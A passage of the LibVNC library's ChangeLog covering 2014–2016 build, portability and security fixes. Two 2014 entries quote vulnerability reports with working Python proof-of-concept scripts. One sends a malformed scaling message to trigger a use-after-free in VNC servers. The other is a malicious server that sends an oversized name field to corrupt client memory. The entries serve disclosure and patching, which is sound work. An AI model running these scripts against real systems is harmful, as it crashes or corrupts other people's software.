	* rfb/rfbclient.h: Fix rfbClientSwap64IfLE broken in
	fe7df89fb1777b4fd303d5a601541f6062caf8ea

2016-06-05  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #84 from plettix/master fix for issue 81

2016-05-30  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt: CMake: Add maybe-found OpenSSL libs to
	libvncclient.

2016-05-30  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt: CMake: Not all platforms have endian.h, so use the
	build system's endianess check.

2016-05-30  Christian Beier <cb@shoutrlabs.com>

	* rfb/rfbproto.h: Only include endian.h if present on system.

2016-05-30  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #105 from cgeorges82/master fix for issue #97. Also, this fixes cmake builds for other
	platforms.

2016-05-13  George Fleury <gfleury@gmail.com>

	* libvncserver/sockets.c: Avoid calling SSL_pending when connection
	is already closed Avoid calling SSL_pending when connection is already closed, calling
	SSL_pending with connection already closed is crashing.  To
	reproduce, open a secure websocket binay protocol connection with
	libvncserver compiled with OpenSSL, and when libvncserver is waiting
	for rfbProcessClientProtocolVersion send any invalid char, it will
	fail and call rfbCloseClient whith destroy all SSL context, calling
	SSL_pending after that will generate a invalid access.

2016-04-24  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #103 from rdieter/master use namespaced vnc_max macro (issue #102)

2016-04-23  gbdj <gbdj@users.noreply.github.com>

	* libvncclient/tls_gnutls.c, libvncclient/vncviewer.c,
	rfb/rfbclient.h: libvncclient/tls_gnutls.c: Add hooks to
	WriteToTLS() for optional protection by mutex. Fix upstream issue
	#100 Squashed commit of the pull request #101 : commit
	1c7e01e81862bc46508e675e83c74cc6d63224b0 commit
	1e749b094d6696380d3f0540a00138d7e3427874

2016-02-18  Rex Dieter <rdieter@math.unl.edu>

	* libvncclient/listen.c, libvncserver/httpd.c,
	libvncserver/rfbserver.c, libvncserver/sockets.c, rfb/rfbproto.h: 
	use namespaced rfbMax macro (issue #102) Not using generic 'max', avoids conflicts with stl_algobase.h

2016-04-15  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #115 from solofox/master Enable AF_UNIX socket: ignore setsockopt TCP_NODELAY failure.

2016-04-13  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #114 from zbierak/master Increase MAX_ENCODINGS value to accommodate more client encodings

2016-04-12  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #110 from AlexejStukov/patch-1 break statement out of case

2016-04-12  zbierak <zbierak@users.noreply.github.com>

	* libvncclient/rfbproto.c: Fix buffer overflow when applying client
	encodings

2016-04-12  Christian Beier <cb@shoutrlabs.com>

	* travis.yml: TravisCI: remove old config.

2016-04-12  Christian Beier <cb@shoutrlabs.com>

	* .travis.yml: TravisCI: add autoreconf step.

2016-04-12  Christian Beier <cb@shoutrlabs.com>

	* .travis.yml: TravisCI: the config starts with a dot!

2016-04-12  Christian Beier <cb@shoutrlabs.com>

	* README, README.md: Add a README.md and and Travis CI status badge.

2016-04-12  Christian Beier <cb@shoutrlabs.com>

	* travis.yml: Add a minimalistic config for Travis CI.

2016-04-08  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #109 from zbierak/master Fix memory access error in camera.c example

2016-04-04  zbierak <zbierak@users.noreply.github.com>

	* examples/camera.c: Fix memory access error in camera.c example

2016-03-05  Cédric Georges <cgeorges@edge-airport.com>

	* CMakeLists.txt, libvncclient/tls_gnutls.c: Append missing include
	directory for GNUTLS and OPENSSL in CMake project Append support of
	gnutls > v 2.99.01 (gnutls_transport_set_global_errno have a
	different signature)

2016-03-05  Cédric Georges <cgeorges@edge-airport.com>

	* CMakeLists.txt: re-up comment

2016-03-05  Cédric Georges <cgeorges@edge-airport.com>

	* CMakeLists.txt, rfb/rfbconfig.h.cmake: Append IPv6 option in CMake
	Project

2016-01-27  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #99 from spaceone/master Ignore null pointers in FillRectangle() and
	CopyRectangleFromRectangle()

2016-01-27  SpaceOne <space@wechall.net>

	* libvncclient/rfbproto.c: Ignore null pointers in FillRectangle()
	and CopyRectangleFromRectangle()

2015-12-03  Christian Beier <cb@shoutrlabs.com>

	* rfb/rfbclient.h: Be a bit clearer with the cursorshape
	documentation for libvncclient.

2015-12-03  Christian Beier <cb@shoutrlabs.com>

	* libvncclient/cursor.c, rfb/rfbclient.h: Properly document
	HandleCursorShape and GotCursorShapeProc.

2015-10-10  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #90 from stweil/fix Fix some recently introduced regressions

2015-10-10  Stefan Weil <sw@weilnetz.de>

	* rfb/rfbproto.h: Fix definition of POSIX data types Commit 92f558482d94c5152174a1983a40863bd6b07911 added stdint.h to
	get the type definitions, but included it after the first use of
	int8_t in builds for Windows.  Signed-off-by: Stefan Weil <sw@weilnetz.de>

2015-10-10  Stefan Weil <sw@weilnetz.de>

	* rfb/rfbproto.h: Fix endianness detection Commit 97f442ef2aa65ade6bea11e90054c57b90abbaca tried to improve the
	endianness detection, but introduced a typo and problems for Windows
	builds (no endian.h, different definition of
	LIBVNCSERVER_WORDS_BIGENDIAN).  Fix both issues.  Signed-off-by: Stefan Weil <sw@weilnetz.de>

2015-10-09  Stefan Weil <sw@weilnetz.de>

	* ChangeLog, Doxyfile, NEWS, README, client_examples/vnc2mpg.c,
	common/zywrletemplate.c, examples/camera.c, libvncclient/listen.c,
	libvncclient/sockets.c, libvncserver/cargs.c, libvncserver/scale.c,
	libvncserver/sockets.c, libvncserver/tight.c,
	libvncserver/tightvnc-filetransfer/filetransfermsg.c,
	libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c,
	libvncserver/tightvnc-filetransfer/rfbtightproto.h,
	libvncserver/tightvnc-filetransfer/rfbtightserver.c,
	libvncserver/ultra.c, libvncserver/zlib.c, rfb/keysym.h, rfb/rfb.h,
	rfb/rfbproto.h, webclients/java-applet/ssl/README,
	webclients/java-applet/ssl/proxy.vnc,
	webclients/java-applet/ssl/ss_vncviewer,
	webclients/java-applet/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
	webclients/novnc/include/display.js,
	webclients/novnc/include/rfb.js, webclients/novnc/include/ui.js: Fix
	some typos (found by codespell) Signed-off-by: Stefan Weil <sw@weilnetz.de>

2015-07-22  plettix <plettix@gmail.com>

	* common/md5.c: another shift fix

2015-07-22  plettix <plettix@gmail.com>

	* rfb/rfb.h, rfb/rfbclient.h: shift fixes - if an integer is a
	negative number then the return value of "Swap32IfLE" was -1

2015-07-07  plettix <plettix@gmail.com>

	* libvncserver/websockets.c: fix for issue 81 use different buffers
	for decode and encode

2015-05-28  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, configure.ac, rfb/rfbproto.h: Instead of letting
	the build system define endianess, rely on endian.h.

2015-05-28  Christian Beier <dontmind@freeshell.org>

	* .gitignore, CMakeLists.txt, Doxyfile, Makefile.am, configure.ac,
	libvncserver/Makefile.am, m4/ax_create_stdint_h.m4, rfb/rfbproto.h: 
	Do away with rfbint.h generation and use stdint.h directly instead.

2015-04-17  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c, libvncclient/vncviewer.c: Re-add the
	useful bits of 9aa9ac59b4cb10bfca93456a3098e348de172d7f.

2015-04-17  Christian Beier <dontmind@freeshell.org>

	* libvncclient/Makefile.am: Revert "Add libvncclient/h264.c to dist
	tarball." This reverts commit 9aa9ac59b4cb10bfca93456a3098e348de172d7f.

2015-04-17  Christian Beier <dontmind@freeshell.org>

	* client_examples/gtkvncviewer.c, configure.ac,
	libvncclient/Makefile.am, libvncclient/h264.c,
	libvncclient/rfbproto.c, libvncclient/vncviewer.c, rfb/rfbproto.h: 
	Revert "LibVNCClient: Add H.264 encoding for framebuffer updates" This reverts commit d891478ec985660c03f95cffda0e6a1ad4ba350c.  Conflicts:         configure.ac         libvncclient/h264.c

2015-04-17  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #70 from maxnet/master httpd: disallow directory traversal

2015-04-17  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #72 from lopago/fix-segfaults prevent segfaults due to uninitialized memory

2015-04-15  Thomas Anderson <tanderson@caltech.edu>

	* configure.ac: configure.ac: Use AC_CHECK_TOOL for cross-compiling
	support.  When cross-compiling the ar program has the appropriate prefix
	prepended.  Respect that here and have autotools autodetect the
	appropriate tool.

2015-04-13  Benjamin Dürholt <b.duerholt@portunity.de>

	* libvncserver/rfbssl_gnutls.c, libvncserver/tight.c: Changed C++
	style comments to C ones

2015-04-10  Benjamin Dürholt <b.duerholt@portunity.de>

	* libvncserver/rfbssl_gnutls.c, libvncserver/tight.c: prevent
	segfault

2015-03-29  Floris Bos <bos@je-eigen-domein.nl>

	* libvncserver/httpd.c: httpd: disallow directory traversal Signed-off-by: Floris Bos <bos@je-eigen-domein.nl>

2015-03-27  Jay Carlson <nop@nop.com>

	* libvncclient/rfbproto.c: Avoid divide-by-zero in raw encoding (OSX
	RealVNC) OS X RealVNC server crashes out Remmina because the server can
	provoke bytesPerLine to be zero. Assume this is coding for zero
	lines.  The condition could be checked before the calculation of
	bytesPerLine.  I donât understand the preconditions of this code
	to say one way or the other.

2015-02-09  Peter Spiess-Knafl <psk@autistici.org>

	* libvncclient/Makefile.am, libvncserver/Makefile.am: Set autotools
	SOVERSION.

2015-02-05  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #63 from LibVNC/sha1rework Replace SHA1 implementation with the one from RFC 6234.

2015-01-27  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #60 from cinemast/master fixing SOVERSION and .so VERSION

2015-01-18  Christian Beier <dontmind@freeshell.org>

	* webclients/index.vnc: Update link to project home page in
	index.vnc.

2015-01-18  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #57 from maxnet/master Fix handling of multiple VNC commands per websockets frame

2015-01-16  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #56 from maxnet/master Only advertise xvp support when xvpHook is set

2015-01-06  Christian Beier <dontmind@freeshell.org>

	* AUTHORS: Add Floris to AUTHORS.

2015-01-06  Christian Beier <dontmind@freeshell.org>

	* NEWS: Update NEWS.

2015-01-02  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #51 from maxnet/master Initialize libgcrypt before use

2015-01-02  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #50 from maxnet/master tls_openssl.c: define _XOPEN_SOURCE for extra POSIX functionality

2014-12-30  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c: Fix another MinGW64 build issue.
	WSAEWOULDBLOCK is not MinGW-specific.

2014-12-30  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: Fix building with mingw-w64.

2014-12-30  Christian Beier <dontmind@freeshell.org>

	* configure.ac: confgure.ac: Remove MinGW linker flag that's
	incompatible with mingw-w64.

2014-12-30  Christian Beier <dontmind@freeshell.org>

	* autogen.sh: autogen.sh: pass cmdline params to configure call.

2014-12-29  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #49 from maxnet/master Fix libva related compile errors

2014-12-29  Floris Bos <bos@je-eigen-domein.nl>

	* configure.ac, libvncclient/h264.c: Fix libva related compile
	errors - Make h264.c compile with recent libva version by including
	va_compat.h - Only enable libva if libva-x11 is installed - Modified configure help text   Previous help text suggested libva was only build when
	  --with-libva was specified, while actual behavior is to build it
	by default.  Warning: THIS CODE IS UNTESTED. Lacking a h.264 capable VNC server
	Also no attempt is made to support platforms not using X11 Signed-off-by: Floris Bos <bos@je-eigen-domein.nl>

2014-10-31  Christian Beier <dontmind@freeshell.org>

	* README: Add VNCpp to projects using LibVNC.

2014-10-21  Christian Beier <dontmind@freeshell.org>

	* ChangeLog: Update ChangeLog for 0.9.10.

2014-10-21  Christian Beier <dontmind@freeshell.org>

	* NEWS: Update NEWS.

2014-10-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/sockets.c: Update comments regarding
	rfbClientConnectionGone().

2014-10-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/scale.c: Fix Use-After-Free vulnerability in
	LibVNCServer wrt scaling.  Reported by Ken Johnson <Ken.Johnson1@telus.com>.  The vulnerability would occur in both the rfbPalmVNCSetScaleFactor
	and rfbSetScale cases in the rfbProcessClientNormalMessage function
	of rfbserver.c. Sending a valid scaling factor is required
	(non-zero)       if (msg.ssc.scale == 0) {           rfbLogPerror("rfbProcessClientNormalMessage: will not
	          accept a scale factor of zero"); rfbCloseClient(cl);           return;       }       rfbStatRecordMessageRcvd(cl, msg.type, sz_rfbSetScaleMsg,
	      sz_rfbSetScaleMsg); rfbLog("rfbSetScale(%d)\n",
	      msg.ssc.scale); rfbScalingSetup(cl,cl->screen->width/msg.ssc.scale,
	cl->screen->height/msg.ssc.scale);       rfbSendNewScaleSize(cl); << This is the call that can trigger
	      a free.  return; at the end, both cases there is a call the rfbSendNewScaleSize
	function, where if the connection is subsequently disconnected after
	sending the VNC scaling message can lead to a free occurring.      else     {         rfbResizeFrameBufferMsg        rmsg;         rmsg.type = rfbResizeFrameBuffer;         rmsg.pad1=0;         rmsg.framebufferWidth  =
	        Swap16IfLE(cl->scaledScreen->width); rmsg.framebufferHeigth
	        = Swap16IfLE(cl->scaledScreen->height); rfbLog("Sending a response
	        to a UltraVNC style frameuffer resize event (%dx%d)\n",
	        cl->scaledScreen->width, cl->scaledScreen->height); if
	            (rfbWriteExact(cl, (char *)&rmsg, sz_rfbResizeFrameBufferMsg) < 0) {
	rfbLogPerror("rfbNewClient: write");             rfbCloseClient(cl);             rfbClientConnectionGone(cl); << Call which may can lead
	            to a free.  return FALSE;         }     }     return TRUE; Once this function returns, eventually rfbClientConnectionGone is
	called again on the return from rfbProcessClientNormalMessage. In
	KRFB server this leads to an attempt to access client->data.  POC script to trigger the vulnerability: ---snip--- import socket,binascii,struct,sys from time import sleep class RFB:     INIT_3008 = "\x52\x46\x42\x20\x30\x30\x33\x2e\x30\x30\x38\x0a"     AUTH_NO_PASS  = "\x01"     AUTH_PASS = "\x02"     SHARE_DESKTOP = "\x01"     def AUTH_PROCESS(self,data,flag):         if flag == 0:             # Get security types             secTypeCount = data[0]             secType = {}             for i in range(int(len(secTypeCount))):                 secType[i] = data[1]             return secType         elif flag == 1:             # Get auth result             # 0 means auth success             # 1 means failure             return data[3]     def AUTH_PROCESS_CHALLENGE(self, data, PASSWORD):         try:             from Crypto.Cipher import DES         except:             print "Error importing crypto. Please fix or do not
	            require authentication" sys.exit(1)         if len(PASSWORD) != 8:             PASSWORD = PASSWORD.ljust(8, '\0')         PASSWORD_SWAP =

	[self.reverse_bits(ord(PASSWORD[0])),self.reverse_bits(ord(PASSWORD[1])),self.reverse_bits(ord(PASSWORD[2])),self.reverse_bits(ord(PASSWORD[3])),self.reverse_bits(ord(PASSWORD[4])),self.reverse_bits(ord(PASSWORD[5])),self.reverse_bits(ord(PASSWORD[6])),self.reverse_bits(ord(PASSWORD[7]))]PASSWORD =



	(struct.pack("BBBBBBBB",PASSWORD_SWAP[0],PASSWORD_SWAP[1],PASSWORD_SWAP[2],PASSWORD_SWAP[3],PASSWORD_SWAP[4],PASSWORD_SWAP[5],PASSWORD_SWAP[6],PASSWORD_SWAP[7]))crypto = DES.new(PASSWORD)         return crypto.encrypt(data)     def reverse_bits(self,x):         a=0         for i in range(8):             a += ((x>>i)&1)<<(7-i)         return a def main(argv):     print "Proof of Concept"     print "Copyright TELUS Security Labs"     print "All Rights Reserved.\n"     try:         HOST = sys.argv[1]         PORT = int(sys.argv[2])     except:         print "Usage: python setscale_segv_poc.py <host> <port>
	        [password]" sys.exit(1)     try:         PASSWORD = sys.argv[3]     except:         print "No password supplied"         PASSWORD = ""     vnc = RFB()     remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     remote.connect((HOST,PORT))     # Get server version     data = remote.recv(1024)     # Send 3.8 version     remote.send(vnc.INIT_3008)     # Get supported security types     data = remote.recv(1024)     # Process Security Message     secType = vnc.AUTH_PROCESS(data,0)     if secType[0] == "\x02":         # Send accept for password auth         remote.send(vnc.AUTH_PASS)         # Get challenge         data = remote.recv(1024)         # Send challenge response         remote.send(vnc.AUTH_PROCESS_CHALLENGE(data,PASSWORD))     elif secType[0] == "\x01":         # Send accept for None pass         remote.send(vnc.AUTH_NO_PASS)     else:         print 'The server sent us something weird during auth.'         sys.exit(1)     # Get result     data = remote.recv(1024)     # Process result     result = vnc.AUTH_PROCESS(data,1)     if result == "\x01":         # Authentication failure.          data = remote.recv(1024)         print 'Authentication failure. Server Reason: ' + str(data)         sys.exit(1)     elif result == "\x00":         print "Authentication success."     else:         print 'Some other authentication issue occured.'         sys.exit(1)     # Send ClientInit     remote.send(vnc.SHARE_DESKTOP)     # Send malicious message     print "Sending malicious data..."     remote.send("\x08\x08\x00\x00")     remote.close() if __name__ == "__main__":     main(sys.argv) ---snap---

2014-10-14  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #43 from maksqwe/fix_rfbSelectBox Fix selData.buttonWidth calculation

2014-10-10  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: Fix possible libvncclient ServerInit
	memory corruption.  This fixes the following oCERT report (oCERT-2014-008 pt.2): There is a similar vulnerability to the previous one I sent. This is
	related to the ServerInit message where the width, the height of the
	server's framebuffer, its pixel format, and the name are sent to the
	client. The name can be used in a malicious manner to trigger a
	memory corruption in the client.  Field             Size --------------------------------- name-length
	[4] name-string  [name-length] Below you will find a PoC script to show the vulnerability. This was
	tested on Fedora 20 with the latest version of krdc.  I have noticed something, where the memory corruption causes the
	program to hang but allows you to try to disconnect. After this it
	hangs. Occasionally there will be segmentation fault in memcpy. This
	can become more reliable if you connect to a different VNC server
	first (Or the wrong port on the malicious server) then connecting to
	the malicious port. Every time I accidentally made the wrong VNC
	connection attempt the next time I connected it segfault'd.  Just run the script it will listen on port 5900 and connect to it
	with krdc for example. I have observed Remmina crash more reliably.  import socket,struct,sys HOST = "" PORT =  5900 c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	c.bind((HOST,PORT)) c.listen(1) conn,addr = c.accept() print "Connected by ", addr protocolVersion3008 =
	"\x52\x46\x42\x20\x30\x30\x33\x2e\x30\x30\x38\x0a"
	conn.send(protocolVersion3008) data = conn.recv(1024) # Receive the version from them.  secTypeNone = "\x01\x01" secTypeAuth = "\x01\x02"
	conn.send(secTypeNone) data = conn.recv(1024) # Receive the secType choice from them.  secResultOk = "\x00" * 4 secResultNo = "\x00\x00\x00\x01"
	conn.send(secResultOk) data = conn.recv(1024) # Receive the ClientInit (Shared-flag).  frameBufferWidth = 0x0480 frameBufferHeight = 0x0360 bitsPerPixel =
	0x20 depth = 0x18 bigEndian = 0x1 trueColor = 0x0 redM = 0x0 greenM
	= 0x0 blueM =  0x0 redS = 0x0 greenS = 0x0 blueS = 0x0 padding =
	"\x00\x00\x00" nameLength = 0xffffffff nameString = "AA" * 0xFFFF +
	"\x00\x0a" conn.send( struct.pack(">HHBBBBHHHBBB",frameBufferWidth,
	frameBufferHeight, bitsPerPixel, depth, bigEndian, trueColor, redM,
	greenM, blueM, redS, greenS, blueS) + padding + struct.pack(">I",
	nameLength) + nameString ) c.close()

2014-10-10  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c: Fix potential memory corruption in
	libvncclient.  Fixes (maybe amongst others) the following oCERT report
	([oCERT-2014-008]): LibVNCServer HandleRFBServerMessage rfbServerCutText malicious
	msg.sct.length It looks like there may be a chance for potential memory corruption
	when a LibVNCServer client attempts to process a Server Cut Text
	message.    case rfbServerCutText:   {     char *buffer;     if (!ReadFromRFBServer(client, ((char *)&msg) + 1,                            sz_rfbServerCutTextMsg - 1))       return FALSE;     msg.sct.length = rfbClientSwap32IfLE(msg.sct.length); <<
	    Retrieve malicious length     buffer = malloc(msg.sct.length+1); << Allocate buffer. Can
	    return 0x0     if (!ReadFromRFBServer(client, buffer, msg.sct.length)) <<
	      Attempt to write to buffer return FALSE;     buffer[msg.sct.length] = 0; << Attempt to write to buffer     if (client->GotXCutText)       client->GotXCutText(client, buffer, msg.sct.length); <<
	      Attempt to write to buffer     free(buffer);     break;   } If a message is provided with an extremely large size it is possible
	to cause the malloc to fail, further leading to an attempt to write
	0x0.

2014-10-09  Christian Beier <dontmind@freeshell.org>

	* NEWS: Update NEWS for 0.9.10.

2014-10-09  Christian Beier <dontmind@freeshell.org>

	* AUTHORS: Update AUTHORS.

2014-10-07  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #42 from LibVNC/autotools-fix-revisited Add autoconf macros that might not be installed with a usual
	autotools setup

2014-10-07  Johannes Schindelin <johannes.schindelin@gmx.de>

	* autogen.sh: Add back a working autogen.sh There was no reason to get rid of the convenient script. Most
	developers who are not in love with autoconf fail to remember that
	autoreconf invocation, therefore it is better to have something
	working in place.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-09-01  Nicolas Ruff <nruff@google.com>

	* libvncserver/rfbserver.c: Fix stack-based buffer overflow There was a possible buffer overflow in rfbFileTransferOffer message
	when processing the FileTime.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-10-07  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #41 from newsoft/master Fixing 2 security issues

2014-10-06  newsoft <newsoft@gmx.fr>

	* libvncserver/scale.c: Make sure that no integer overflow could
	occur during scaling

2014-10-06  Christian Beier <dontmind@freeshell.org>

	* libvncclient/Makefile.am: Add libvncclient/h264.c to dist tarball.  Otherwise the sources from a 'make dist' package wouldn't compile.

2014-10-03  Christian Beier <dontmind@freeshell.org>

	* m4/.gitignore: Really add empty m4 subdirectory.  This change kinda got lost with the last commit re-splitting.

2014-10-02  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #38 from LibVNC/autotools-fix-revisited Autotools fix revisited.

2014-10-02  Christian Beier <dontmind@freeshell.org>

	* webclients/novnc/LICENSE.txt, webclients/novnc/README.md,
	webclients/novnc/include/base.css,
	webclients/novnc/include/base64.js,
	webclients/novnc/include/black.css,
	webclients/novnc/include/blue.css,
	webclients/novnc/include/chrome-app/tcp-client.js,
	webclients/novnc/include/des.js,
	webclients/novnc/include/display.js,
	webclients/novnc/include/input.js,
	webclients/novnc/include/jsunzip.js,
	webclients/novnc/include/keyboard.js,
	webclients/novnc/include/keysym.js,
	webclients/novnc/include/keysymdef.js,
	webclients/novnc/include/playback.js,
	webclients/novnc/include/rfb.js, webclients/novnc/include/ui.js,
	webclients/novnc/include/util.js,
	webclients/novnc/include/web-socket-js/web_socket.js,
	webclients/novnc/include/websock.js,
	webclients/novnc/include/webutil.js, webclients/novnc/vnc.html,
	webclients/novnc/vnc_auto.html: Update noVNC HTML5 client to latest
	version from https://github.com/kanaka/noVNC.

2014-09-21  Brian Bidulock <bidulock@openss7.org>

	* .gitignore: add a few more ignores

2014-09-21  Brian Bidulock <bidulock@openss7.org>

	* autogen.sh: removed autogen.sh  - no longer applicable: use autoreconf -fiv

2014-10-02  Christian Beier <dontmind@freeshell.org>

	* INSTALL, acinclude.m4, ltmain.sh: Remove autotools-related files
	that will get installed by autoreconf -i.

2014-10-02  Brian Bidulock <bidulock@openss7.org>

	* Makefile.am, configure.ac: Use an m4 script subdirectory, fix
	automake init and two macro names.

2014-10-02  Brian Bidulock <bidulock@openss7.org>

	* client_examples/Makefile.am, examples/Makefile.am,
	examples/android/Makefile.am, libvncclient/Makefile.am,
	libvncserver/Makefile.am, test/Makefile.am: Rename obsolete INCLUDES
	to AM_CPPFLAGS

2014-09-30  Johannes Schindelin <johannes.schindelin@gmx.de>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	Close unclosed comments ;-) Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-09-30  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #36 from danielgindi/master A forgotten `#ifdef WIN32` broke UNIX build.

2014-09-30  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #33 from danielgindi/master More MSVC adjustments, now focuses on the libvncserver

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c: 
	These are UNIX headers, and are not available on MSVC

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* rfb/rfb.h: Those are generally the windows headers, not just MinGW

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncserver/rfbserver.c: On windows, use the Win32 calls for
	directory enumerations.  We also do not need the conversion between UNIX values to Windows
	values in the RTF_FIND_DATA struct, as we already are on windows.

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncserver/httpd.c, libvncserver/rfbserver.c,
	libvncserver/sockets.c, rfb/rfbclient.h: Generally adjusting headers
	for compiling on windows without the mixing of Winsock 1 and 2.

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncserver/rfbserver.c: Just use a macro to bridge to the Win32
	version of `mkdir` The additional compat_mkdir function was not necessary at all.

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* compat/msvc/sys/time.h: Use correct `winsock2.h` version header
	instead of winsock.h.  `windows.h` is referring to `winsock.h` (unless the
	`WIN32_LEAN_AND_MEAN` is defined).  The structs used in this header
	are defined in `winsock2.h` or in `winsock.h`, but we are using
	Winsock2 of course! So we have to include winsock2.h and refrain
	from including windows.h here

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncserver/httpd.c, libvncserver/rfbserver.c,
	libvncserver/sockets.c: Fixed a violation of the C89 standard
	("declarations must come before instructions")

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncserver/tightvnc-filetransfer/filetransfermsg.c: A windows
	version for directory enumerations Basically taken from https://github.com/danielgindi/FileDir with
	some adjustments

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncserver/tightvnc-filetransfer/filetransfermsg.c: MSVC also
	has the __FUNCTION__ predefined

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncserver/tightvnc-filetransfer/filetransfermsg.c,
	libvncserver/tightvnc-filetransfer/filetransfermsg.h: 
	`CreateDirectory` might clash with the
	`CreateDirectoryA`/`CreateDirectoryW` macros on MSVC

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncserver/tightvnc-filetransfer/filetransfermsg.c: Fail when
	NULL is passed to CreateFileListInfo() Passing NULL to sprintf() would most likely crash the program.

2014-09-20  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncclient/rfbproto.c, libvncclient/vncviewer.c,
	libvncserver/rfbserver.c, libvncserver/sockets.c,
	libvncserver/stats.c, libvncserver/websockets.c: `strings.h` and
	`resolv.h` are not available on MSVC, and some POSIX functions are
	renamed or deprecated For all of those missing/deprecated POSIX functions, we just add a
	macro mapping to the _underscored version of MSVC.

2014-09-09  Christian Beier <dontmind@freeshell.org>

	* client_examples/Makefile.am: The HAVE_X11 define is not there
	anymore, but we don't need it either.

2014-09-09  Christian Beier <dontmind@freeshell.org>

	* Makefile.am, configure.ac, vncterm/ChangeLog, vncterm/LinuxVNC.c,
	vncterm/Makefile.am, vncterm/README, vncterm/TODO,
	vncterm/VNCommand.c, vncterm/VNConsole.c, vncterm/VNConsole.h,
	vncterm/example.c, vncterm/vga.h: Move vncterm to
	https://github.com/LibVNC/vncterm.

2014-09-09  Christian Beier <dontmind@freeshell.org>

	* VisualNaCro/.gitignore, VisualNaCro/AUTHORS,
	VisualNaCro/ChangeLog, VisualNaCro/Makefile.am, VisualNaCro/NEWS,
	VisualNaCro/README, VisualNaCro/autogen.sh,
	VisualNaCro/configure.ac, VisualNaCro/default8x16.h,
	VisualNaCro/nacro.c, VisualNaCro/nacro.h, VisualNaCro/recorder.pl: 
	Move VisualNaCro to https://github.com/LibVNC/VisualNaCro.

2014-09-09  Christian Beier <dontmind@freeshell.org>

	* prepare_x11vnc_dist.sh: Move prepare_x11vnc_dist.sh over to x11vnc
	repo.

2014-09-03  Christian Beier <dontmind@freeshell.org>

	* Makefile.am, configure.ac: Remove x11vnc from autotools build
	system.

2014-09-03  Christian Beier <dontmind@freeshell.org>

	* tightvnc-1.3dev5-vncviewer-alpha-cursor.patch: Remove
	tightvnc-1.3dev5-vncviewer-alpha-cursor.patch.

2014-09-03  Christian Beier <dontmind@freeshell.org>

	* x11vnc/.cvsignore, x11vnc/8to24.c, x11vnc/8to24.h,
	x11vnc/ChangeLog, x11vnc/Makefile.am, x11vnc/README,
	x11vnc/RELEASE-NOTES, x11vnc/allowed_input_t.h, x11vnc/appshare.c,
	x11vnc/avahi.c, x11vnc/avahi.h, x11vnc/blackout_t.h,
	x11vnc/cleanup.c, x11vnc/cleanup.h, x11vnc/connections.c,
	x11vnc/connections.h, x11vnc/cursor.c, x11vnc/cursor.h,
	x11vnc/enc.h, x11vnc/enums.h, x11vnc/gui.c, x11vnc/gui.h,
	x11vnc/help.c, x11vnc/help.h, x11vnc/inet.c, x11vnc/inet.h,
	x11vnc/keyboard.c, x11vnc/keyboard.h, x11vnc/linuxfb.c,
	x11vnc/linuxfb.h, x11vnc/macosx.c, x11vnc/macosx.h,
	x11vnc/macosxCG.c, x11vnc/macosxCG.h, x11vnc/macosxCGP.c,
	x11vnc/macosxCGP.h, x11vnc/macosxCGS.c, x11vnc/macosxCGS.h,
	x11vnc/macosx_opengl.c, x11vnc/macosx_opengl.h,
	x11vnc/misc/.cvsignore, x11vnc/misc/LICENSE,
	x11vnc/misc/Makefile.am, x11vnc/misc/README, x11vnc/misc/Xdummy,
	x11vnc/misc/blockdpy.c, x11vnc/misc/connect_switch,
	x11vnc/misc/desktop.cgi, x11vnc/misc/dtVncPopup,
